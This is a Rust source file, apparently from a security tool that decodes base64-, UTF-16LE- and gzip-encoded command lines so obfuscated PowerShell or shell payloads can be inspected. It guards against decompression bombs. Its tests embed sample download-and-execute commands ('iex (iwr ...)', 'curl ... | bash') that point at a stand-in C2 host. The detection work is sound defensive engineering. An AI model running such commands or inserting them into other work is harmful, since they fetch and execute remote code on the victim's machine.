use super::Decoder;
use crate::util::{printable_ratio, re};
use base64::alphabet;
use base64::engine::{DecodePaddingMode, GeneralPurpose, GeneralPurposeConfig};
use base64::Engine as _;
use flate2::read::{DeflateDecoder, GzDecoder, ZlibDecoder};
use regex::Regex;
use std::io::Read;
use std::sync::LazyLock;

const CFG: GeneralPurposeConfig = GeneralPurposeConfig::new()
    .with_decode_padding_mode(DecodePaddingMode::Indifferent)
    .with_decode_allow_trailing_bits(true);
const STD: GeneralPurpose = GeneralPurpose::new(&alphabet::STANDARD, CFG);
const URL: GeneralPurpose = GeneralPurpose::new(&alphabet::URL_SAFE, CFG);

/// Candidate tokens: 20+ chars of either alphabet, optional padding.
static TOKEN: LazyLock<Regex> = LazyLock::new(|| re(r"[A-Za-z0-9+/_-]{20,}={0,2}"));
static HEX_ONLY: LazyLock<Regex> = LazyLock::new(|| re(r"^[0-9a-f]+$"));

fn raw_decode(token: &str) -> Option<Vec<u8>> {
    let t = token.trim_end_matches('=');
    if HEX_ONLY.is_match(t) {
        // Hashes, commit SHAs. The hex decoder handles real hex payloads.
        return None;
    }
    STD.decode(t).ok().or_else(|| URL.decode(t).ok())
}

/// Interpret decoded bytes as text: UTF-16LE (PowerShell -EncodedCommand) or UTF-8.
pub(crate) fn bytes_to_text(bytes: &[u8], min_printable: f64) -> Option<String> {
    if bytes.len() < 6 {
        return None;
    }
    if bytes.len().is_multiple_of(2) {
        let odd_zero = bytes.iter().skip(1).step_by(2).filter(|&&b| b == 0).count();
        if odd_zero * 10 >= (bytes.len() / 2) * 8 {
            let units: Vec<u16> = bytes
                .as_chunks::<2>()
                .0
                .iter()
                .map(|c| u16::from_le_bytes([c[0], c[1]]))
                .collect();
            let s = String::from_utf16_lossy(&units);
            if printable_ratio(&s) >= min_printable {
                return Some(s);
            }
        }
    }
    let s = std::str::from_utf8(bytes).ok()?;
    (printable_ratio(s) >= min_printable).then(|| s.to_string())
}

/// Standard, URL-safe and UTF-16LE base64. Replaces each decodable token in place.
pub struct Base64Decoder;

impl Decoder for Base64Decoder {
    fn name(&self) -> &'static str {
        "base64"
    }
    fn try_decode(&self, input: &str) -> Option<String> {
        let mut changed = false;
        let out = TOKEN.replace_all(input, |caps: &regex::Captures| {
            let tok = &caps[0];
            if let Some(text) = raw_decode(tok).and_then(|b| bytes_to_text(&b, 0.9)) {
                changed = true;
                text
            } else {
                tok.to_string()
            }
        });
        changed.then(|| out.into_owned())
    }
}

/// Gzip / zlib / raw-deflate wrapped in base64 (PowerShell GzipStream / DeflateStream
/// one-liners). Bounded read: never inflates past 100x the input, so a decompression
/// bomb trips the pipeline's expansion guard instead of eating memory.
pub struct GzipBase64Decoder;

impl Decoder for GzipBase64Decoder {
    fn name(&self) -> &'static str {
        "gzip_base64"
    }
    fn try_decode(&self, input: &str) -> Option<String> {
        let limit = (input.len().max(64) as u64) * 100 + 1;
        let deflate_hint = input.to_ascii_lowercase().contains("deflatestream");
        let mut changed = false;
        let out = TOKEN.replace_all(input, |caps: &regex::Captures| {
            let tok = &caps[0];
            let Some(bytes) = raw_decode(tok) else {
                return tok.to_string();
            };
            let mut buf = Vec::new();
            let ok = match bytes.as_slice() {
                [0x1f, 0x8b, ..] => GzDecoder::new(&bytes[..])
                    .take(limit)
                    .read_to_end(&mut buf)
                    .is_ok(),
                [0x78, 0x01 | 0x5e | 0x9c | 0xda, ..] => ZlibDecoder::new(&bytes[..])
                    .take(limit)
                    .read_to_end(&mut buf)
                    .is_ok(),
                _ if deflate_hint => DeflateDecoder::new(&bytes[..])
                    .take(limit)
                    .read_to_end(&mut buf)
                    .is_ok(),
                _ => false,
            };
            if !ok || buf.is_empty() {
                return tok.to_string();
            }
            match bytes_to_text(&buf, 0.85) {
                Some(t) => {
                    changed = true;
                    t
                }
                None if buf.len() as u64 >= limit => {
                    // Bomb: return something oversized so the pipeline flags it.
                    changed = true;
                    String::from_utf8_lossy(&buf).into_owned()
                }
                None => tok.to_string(),
            }
        });
        changed.then(|| out.into_owned())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use flate2::write::GzEncoder;
    use flate2::Compression;
    use std::io::Write;

    #[test]
    fn utf16le_encoded_command() {
        let payload = "iex (iwr https://c2.invalid/a)";
        let units: Vec<u8> = payload
            .encode_utf16()
            .flat_map(|u| u.to_le_bytes())
            .collect();
        let b64 = STD.encode(units);
        let out = Base64Decoder
            .try_decode(&format!("powershell -w h -enc {b64}"))
            .unwrap();
        assert!(out.contains(payload), "{out}");
        assert!(out.starts_with("powershell -w h -enc "));
    }

    #[test]
    fn url_safe() {
        let b64 = URL.encode("curl -s https://c2.invalid/?a=1>>2 | bash");
        assert!(Base64Decoder.try_decode(&b64).unwrap().contains("| bash"));
    }

    #[test]
    fn ignores_hashes_and_garbage() {
        assert!(Base64Decoder
            .try_decode("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855")
            .is_none());
        assert!(Base64Decoder
            .try_decode("/usr/local/lib/python3/site-packages/foo")
            .is_none());
    }

    #[test]
    fn gzip_roundtrip() {
        let mut e = GzEncoder::new(Vec::new(), Compression::default());
        e.write_all(b"iex (iwr https://c2.invalid/gz)").unwrap();
        let b64 = STD.encode(e.finish().unwrap());
        let out = GzipBase64Decoder
            .try_decode(&format!("FromBase64String('{b64}')"))
            .unwrap();
        assert!(out.contains("c2.invalid/gz"));
    }

    #[test]
    fn bomb_is_bounded() {
        let mut e = GzEncoder::new(Vec::new(), Compression::best());
        e.write_all(&vec![b'A'; 4 << 20]).unwrap();
        let b64 = STD.encode(e.finish().unwrap());
        let out = GzipBase64Decoder.try_decode(&b64).unwrap();
        assert!(out.len() as u64 <= (b64.len() as u64) * 100 + 1);
    }
}
